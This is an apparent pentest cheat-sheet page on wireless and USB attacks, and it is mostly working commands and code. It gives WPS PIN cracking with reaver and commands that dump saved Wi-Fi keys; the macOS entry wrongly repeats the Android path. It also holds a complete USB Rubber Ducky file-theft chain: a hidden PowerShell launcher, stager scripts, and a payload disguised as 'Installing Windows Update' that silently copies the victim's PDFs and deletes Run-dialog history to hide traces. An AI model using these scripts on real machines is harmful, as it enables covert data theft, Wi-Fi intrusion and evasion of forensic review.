---
title: Wireless
category: Exploitation
order: 99
---

> **Monitor Mode** 

{% highlight bash %}
$ sudo airmon-ng start wlan0
{% endhighlight %}

Note: If an error occors try the following:
{% highlight bash %}
$ sudo airmon-ng check kill
$ sudo airmon-ng start wlan0
{% endhighlight %}

> **WPS** 

The following need to be installed:<br>
* [Reaver](https://code.google.com/p/reaver-wps/)

{% highlight bash %}
#Search for WPS that is enabled and not locked
$ sudo wash -i wlan0mon -C

#Once located start the attack
$ sudo reaver -i wlan0mon 00:00:00:00:00:00 -S -v

#If reaver keeps tring 12345670:
$ sudo reaver -i wlan0mon -b 00:24:B2:88:CC:65 -S -v -N
{% endhighlight %}


> **Client Keys** 

Android:
{% highlight bash %}
$ cat /data/misc/wifi/wpa_supplicant.conf | grep psk=
{% endhighlight %}

OSX:
{% highlight bash %}
# Requires User Access
$ cat /data/misc/wifi/wpa_supplicant.conf | grep psk=
{% endhighlight %}

Windows:
{% highlight powershell %}
netsh wlan show profiles
{% endhighlight %}
* http://www.nirsoft.net/utils/wireless_key.html


> **Clean up run history** 

{% highlight powershell %}
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
{% endhighlight %}

> **Run the Program and Clean-up**

{% highlight powershell %}
powershell -NoP -NonI -W Hidden -Exec Bypass "rp -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue; $up = Get-WMIObject Win32Volume | ? { $_.Label -eq 'DN' } | select name; cd $uP.name; .\d.cmd"
#Note: Runtime max is 260 characters - use aliases to reduce
#Note: _ is Drive Name
{% endhighlight %}

{% highlight powershell %}
#Second Version
powershell "$u=gwmi Win32_Volume|?($_Label -eq'_')|select name; cd $uname;.\d.cmd"
#65 Character Version
powershell".((gwmi win32_volume -f 'label=''_''').Name+'d.cmd')"
#Note: Runtime max is 260 characters - use aliases to reduce
#Note: _ is Drive Name
#Note: The shorter versions don't change the directory
{% endhighlight %}

> **d.cmd: Stager 1** 

{% highlight powershell %}
@echo off
REM start /MIN e.cmd
@cls
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}')"
cscript i.vbs e.cmd
@exit
#Note: Powershell portion flashes the CAPS lock button to demonstrate that the first stage has completed successfully
{% endhighlight %}

> **i.vbs: Stager 2** 
{% highlight vb %}
CreateObject("Wscript.Shell").Run """ & WScript.Arguments(0) & """", 0, False
{% endhighlight %}

> **e.cmd: Payload** 

{% highlight powershell %}
@echo off
@echo Installing Windows Update

REM Delete registry keys storing Run dialog history
REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f

REM Creates directory compromised of computer name, date and time
REM %~d0 = path to this batch file. %COMPUTERNAME%, %date% and %time% pretty obvious
set dst=%~d0\slurp\%COMPUTERNAME%_%date:~-4,4%%date:~-10,2%%date:~7,2%_%time:~-11,2%%time:~-8,2%%time:~-5,2%
mkdir %dst% >>nul

if Exist %USERPROFILE%\Documents (
REM /C Continues copying even if errors occur.
REM /Q Does not display file names while copying.
REM /G Allows the copying of encrypted files to destination that does not support encryption.
REM /Y Suppresses prompting to confirm you want to overwrite an existing destination file.
REM /E Copies directories and subdirectories, including empty ones.

REM xcopy /C /Q /G /Y /E %USERPROFILE%\Documents\*.pdf %dst% >>nul

REM Same as above but does not create empty directories
xcopy /C /Q /G /Y /S %USERPROFILE%\Documents\*.pdf %dst% >>nul
)

REM Blink CAPSLOCK key
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$wsh = New-Object -ComObject WScript.Shell;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}');sleep -m 250;$wsh.SendKeys('{CAPSLOCK}')"

@cls
@exit
{% endhighlight %}

> **Rubber Ducky Stager**

{% highlight bash %}
REM USB Exfiltration Payload from Hak5 episodes 2112 - 2114
REM Target: Windows XP SP3+ Author: Hak5Darren Props: Diggster, Midnightsnake
DELAY 1000
GUI r
DELAY 100
STRING powershell ".((gwmi win32_volume -f 'label=''_''').Name+'d.cmd')"
ENTER
{% endhighlight %}

> **Encode Using Rubber Ducky Encoder**

{% highlight bash %}
java -jar duckencode.jar -i ../slerp/payload.txt -o inject.bin
./ducktools.py -e -l us ../slerp/payload.txt inject.bin
{% endhighlight %}

> **Flashing Rubber Ducky**

{% highlight bash %}
sudo apt-get install dfu-programmer
sudo dfu-programmer at32uc3b1256 dump
sudo dfu-programmer at32uc3b1256 erase
sudo dfu-programmer at32uc3b1256 flash --supress-bootloader-mem c_duckv2.1.hex
sudo eject /media/dk/_
{% endhighlight %}

{% highlight bash %}
sudo ./ducky-flasher
sudo eject /media/dk/_
{% endhighlight %}

> **Further References** 

Rubber Ducky Encoder:<br>
[https://github.com/hak5darren/USB-Rubber-Ducky/blob/master/Ducky_Encoder_GUI.jar](https://github.com/hak5darren/USB-Rubber-Ducky/blob/master/Ducky_Encoder_GUI.jar)
[https://github.com/kevthehermit/DuckToolkit](https://github.com/kevthehermit/DuckToolkit)

Create a Rubber Ducky:<br>
[http://www.pentestingshop.com/pentesting/make-your-own-usb-rubber-ducky-using-a-normal-usb-stick](http://www.pentestingshop.com/pentesting/make-your-own-usb-rubber-ducky-using-a-normal-usb-stick)
[https://forums.hak5.org/index.php?/topic/34950-how-to-make-a-usb-rubber-ducky-using-a-normal-usb-
stick](https://forums.hak5.org/index.php?/topic/34950-how-to-make-a-usb-rubber-ducky-using-a-normal-usb-stick)

Payloads:<br>
[https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads)
[https://github.com/hak5darren/USB-Rubber-Ducky/wiki/My-first-payload](https://github.com/hak5darren/USB-Rubber-Ducky/wiki/My-first-payload)

[https://www.hak5.org/episodes/season-21/hak5-2112-stealing-files-with-the-usb-rubber-ducky](https://www.hak5.org/episodes/season-21/hak5-2112-stealing-files-with-the-usb-rubber-ducky)

[https://github.com/hak5darren/USB-Rubber-Ducky](https://github.com/hak5darren/USB-Rubber-Ducky)

[http://usbrubberducky.com/#!index.md](http://usbrubberducky.com/#!index.md)

[https://www.hak5.org/blog/hak5/stealing-files-with-the-usb-rubber-ducky-usb-exfiltration-explained](https://www.hak5.org/blog/hak5/stealing-files-with-the-usb-rubber-ducky-usb-exfiltration-explained)

[](https://www.hak5.org/blog/hak5/stealing-files-with-the-usb-rubber-ducky-usb-exfiltration-explained)


